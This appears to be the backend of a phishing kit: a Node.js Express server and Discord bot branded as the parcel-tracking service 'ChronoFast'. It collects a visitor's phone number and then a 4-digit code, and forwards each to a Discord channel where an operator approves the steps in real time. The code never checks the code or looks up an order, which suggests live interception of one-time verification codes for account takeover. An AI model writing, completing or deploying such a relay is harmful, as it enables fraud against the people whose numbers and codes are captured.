require('dotenv').config();
const express = require('express');
const {
    Client,
    GatewayIntentBits,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    EmbedBuilder,
} = require('discord.js');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app     = express();
const discord = new Client({ intents: [GatewayIntentBits.Guilds] });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Sessions en mémoire  { [id]: { phone, status, enteredCode? } }
// status : pending_first | awaiting_code | pending_second | approved | refused
const sessions = {};

const SESSION_TTL = 30 * 60 * 1000; // 30 min

// ── Discord bot ──────────────────────────────────────────────────────────────
discord.once('ready', () => {
    console.log(`[Discord] Connecté en tant que ${discord.user.tag}`);
});

discord.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    const parts     = interaction.customId.split(':');
    const action    = parts[0];          // confirm | refuse
    const sessionId = parts[1];
    const step      = parts[2];          // 1 | 2

    const session = sessions[sessionId];
    if (!session) {
        return interaction.reply({ content: '⚠️ Session expirée ou introuvable.', ephemeral: true });
    }

    if (step === '1') {
        if (action === 'confirm') {
            session.status = 'awaiting_code';
            await interaction.update({
                embeds: [makeEmbed(
                    '✅ Demande confirmée',
                    `Numéro : **${session.phone}**\nEn attente de la saisie du code…`,
                    0x22c55e,
                )],
                components: [],
            });
        } else {
            session.status = 'refused';
            await interaction.update({
                embeds: [makeEmbed(
                    '❌ Demande refusée',
                    `Numéro : **${session.phone}**`,
                    0xef4444,
                )],
                components: [],
            });
        }
    } else if (step === '2') {
        if (action === 'confirm') {
            session.status = 'approved';
            await interaction.update({
                embeds: [makeEmbed(
                    '✅ Accès accordé',
                    `Numéro : **${session.phone}**\nCode : **${session.enteredCode}**\nL'utilisateur est redirigé.`,
                    0x22c55e,
                )],
                components: [],
            });
        } else {
            session.status = 'refused';
            await interaction.update({
                embeds: [makeEmbed(
                    '❌ Code refusé',
                    `Numéro : **${session.phone}**\nCode entré : **${session.enteredCode}**`,
                    0xef4444,
                )],
                components: [],
            });
        }
    }
});

function makeEmbed(title, description, color) {
    return new EmbedBuilder()
        .setTitle(title)
        .setDescription(description)
        .setColor(color)
        .setTimestamp()
        .setFooter({ text: 'ChronoFast' });
}

function makeRow(sessionId, step) {
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId(`confirm:${sessionId}:${step}`)
            .setLabel('✅ Confirmer')
            .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId(`refuse:${sessionId}:${step}`)
            .setLabel('❌ Refuser')
            .setStyle(ButtonStyle.Danger),
    );
}

// ── Routes API ───────────────────────────────────────────────────────────────

// Démarrer une session
app.post('/api/start', async (req, res) => {
    const { phone } = req.body;
    if (!phone || typeof phone !== 'string') {
        return res.status(400).json({ error: 'Numéro de téléphone requis.' });
    }

    const sessionId = uuidv4();
    sessions[sessionId] = { phone, status: 'pending_first' };
    setTimeout(() => delete sessions[sessionId], SESSION_TTL);

    const embed = makeEmbed(
        '📦 Nouvelle demande de suivi',
        `Un client souhaite consulter sa commande.\n\n📱 **Numéro :** ${phone}\n\nConfirmez ou refusez la demande :`,
        0x3b82f6,
    );

    try {
        const channel = await discord.channels.fetch(process.env.DISCORD_CHANNEL_ID);
        await channel.send({ embeds: [embed], components: [makeRow(sessionId, '1')] });
        res.json({ sessionId });
    } catch (err) {
        console.error('[Discord] Erreur envoi message :', err.message);
        delete sessions[sessionId];
        res.status(500).json({ error: 'Impossible de contacter Discord.' });
    }
});

// Statut de la session
app.get('/api/status/:id', (req, res) => {
    const session = sessions[req.params.id];
    if (!session) return res.status(404).json({ error: 'Session introuvable.' });
    res.json({ status: session.status });
});

// Soumettre le code 4 chiffres
app.post('/api/submit-code', async (req, res) => {
    const { sessionId, code } = req.body;
    const session = sessions[sessionId];

    if (!session)                         return res.status(404).json({ error: 'Session introuvable.' });
    if (session.status !== 'awaiting_code') return res.status(400).json({ error: 'Action non autorisée.' });
    if (!/^\d{4}$/.test(code))            return res.status(400).json({ error: 'Code invalide.' });

    session.enteredCode = code;
    session.status      = 'pending_second';

    const embed = makeEmbed(
        '🔐 Code saisi par le client',
        `Numéro : **${session.phone}**\nCode entré : **${code}**\n\nValider ou refuser l'accès ?`,
        0xf59e0b,
    );

    try {
        const channel = await discord.channels.fetch(process.env.DISCORD_CHANNEL_ID);
        await channel.send({ embeds: [embed], components: [makeRow(sessionId, '2')] });
        res.json({ ok: true });
    } catch (err) {
        console.error('[Discord] Erreur envoi message :', err.message);
        session.status = 'awaiting_code';
        res.status(500).json({ error: 'Impossible de contacter Discord.' });
    }
});

// ── Démarrage ────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`[Serveur] ChronoFast démarré sur le port ${PORT}`);
});

discord.login(process.env.DISCORD_TOKEN).catch((err) => {
    console.error('[Discord] Impossible de se connecter :', err.message);
    process.exit(1);
});
